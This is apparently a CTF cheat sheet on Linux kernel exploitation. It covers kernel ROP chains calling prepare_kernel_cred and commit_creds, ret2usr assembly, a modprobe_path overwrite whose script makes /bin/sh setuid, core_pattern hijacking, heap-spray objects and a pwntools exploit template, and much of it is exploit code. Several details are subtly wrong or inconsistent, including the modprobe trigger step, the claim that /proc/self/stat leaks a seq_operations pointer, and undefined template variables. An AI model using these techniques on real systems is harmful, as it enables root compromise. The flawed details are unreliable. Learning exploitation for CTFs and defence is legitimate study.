# CTF Pwn - Kernel Exploitation Fundamentals

## Environment Setup

### QEMU Launch
```bash
qemu-system-x86_64 \
  -kernel bzImage \
  -initrd initramfs.cpio.gz \
  -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" \
  -cpu qemu64 \
  -m 256M \
  -nographic \
  -s \
  -S  # wait for GDB
```

`-s` = `-gdb tcp::1234` (shorthand). `-S` freezes VM at boot for GDB attachment.

### Kernel Debugging Symbols
```bash
# Extract vmlinux from bzImage
python3 extract-vmlinux.py bzImage > vmlinux
# Or:
/usr/src/linux/scripts/extract-vmlinux bzImage > vmlinux
```

### Module Info
```bash
# Inside VM (as root)
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# Module symbols in GDB
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
```

---

## Kernel Stack Overflow

### Basic Pattern
```python
# Stack layout: [buf][canary][saved_rbp][ret][...]
# Overflow buffer → corrupt canary → ret → kROP chain

# Step 1: Leak canary + kernel text pointer
payload = b'A' * offset + b'B' * 8  # leak canary + pie leak
read(fd, leak, sizeof(leak))

# Step 2: Kernel ROP chain
rop = flat(
    cookie,
    0, 0, 0,  # saved regs
    pop_rdi_ret, 0,
    prepare_kernel_cred,
    mov_rdi_rax_pop_ret,
    0,
    commit_creds,
    kpti_trampoline + 22,
    0, 0, user_rip, user_cs, user_rflags, user_sp, user_ss
)
write(fd, rop)
```

### Canary Leak
```python
# Kernel stack canary: __stack_chk_fail pointer
# Leak via: overflow buffer → canary in leak
# Canary typically at rbp-0x8 or similar offset
```

---

## Privilege Escalation

### ret2usr (No SMEP/SMAP)
Directly call `prepare_kernel_cred(0)` → `commit_creds(result)` from userland.

```c
void privesc() {
    __asm__(
        "movabs rax, prepare_kernel_cred;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, commit_creds;"
        "call rax;"
        "swapgs;"
        "iretq;"
    );
}
```

### Kernel ROP (SMEP + KPTI)
```python
rop = flat(
    pop_rdi_ret,
    0,
    prepare_kernel_cred,
    mov_rdi_rax_pop_ret,
    0,
    commit_creds,
    kpti_trampoline + 22,  # KPTI bypass
    0, 0,
    user_rip, user_cs, user_rflags, user_sp, user_ss
)
```

---

## modprobe_path Overwrite

**When:** Arbitrary Address Write (AAW) available.

```python
# Find modprobe_path address
modprobe_path_addr = get_kernel_symbol("modprobe_path")

# Write evil script path
write_addr(modprobe_path_addr, b"/tmp/evil.sh\x00")

# Trigger: any execution of unprivileged program
system("/tmp/evil.sh")
```

**modprobe_path exploitation:**
```bash
echo "#!/bin/sh" > /tmp/evil.sh
echo "chmod +s /bin/sh" >> /tmp/evil.sh
chmod +x /tmp/evil.sh
# Create program with unknown binary type to trigger modprobe
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger  # triggers modprobe → runs /tmp/evil.sh as root
```

---

## core_pattern Overwrite

```python
# Overwrite core_pattern with pipe command
core_pattern_addr = get_kernel_symbol("core_pattern")
write_addr(core_pattern_addr, b"|/tmp/evil.sh\x00")

# Trigger core dump
kill(getpid(), SIGSEGV)
```

---

## Heap Spray Structures

Common kernel objects for heap spraying:

### tty_struct (0x400 bytes)
```python
# Spray via openpty() or /dev/ptmx
pty_fd = openpty()  # returns (master_fd, slave_fd)
# tty_struct allocated at known offset from slave_fd
```

### poll_list (0x20 bytes)
```python
# Trigger via poll() syscall
poll(fds, nfds, timeout)
```

### user_key_payload (variable)
```python
# Keyctl commands to allocate
keyctl add user keyring_name "data" @s
```

### seq_operations (0x38 bytes)
```python
# Trigger via /proc/* files
open("/proc/self/stat", O_RDONLY)
read(fd, buf, 0x38)  # leaks seq_operations pointer
```

---

## Exploit Template
```python
from pwn import *

HOST = 'localhost'
PORT = 1337

# Addresses from vmlinux
PREPARE_KERNEL_CRED = 0xffffffff810a14a0
COMMIT_CREDS = 0xffffffff810a1060
POP_RDI_RET = 0xffffffff810d15d0
MOV_RDI_RAX_POP_RET = 0xffffffff81038010
KPTI_TRAMPOLINE = 0xffffffff81200f10

def get_conn():
    return remote(HOST, PORT)

def get_shell():
    if args.REMOTE:
        return get_conn()
    else:
        return process(BINARY)

p = get_shell()

# Leak stage
payload = b'A' * offset
p.send(payload)
leak = p.recv()

# Build and send exploit
p.send(rop)
p.interactive()
```

---

## Key Offsets (Generic Reference)
| Symbol | Typical Offset (KASLR slide varies) |
|--------|-------------------------------------|
| `prepare_kernel_cred` | ~0xa14a0 |
| `commit_creds` | ~0xa1060 |
| `kpti_trampoline` | ~0x200f10 |
| `modprobe_path` | ~0x14c5a80 |
| `core_pattern` | ~0x14c52a0 |
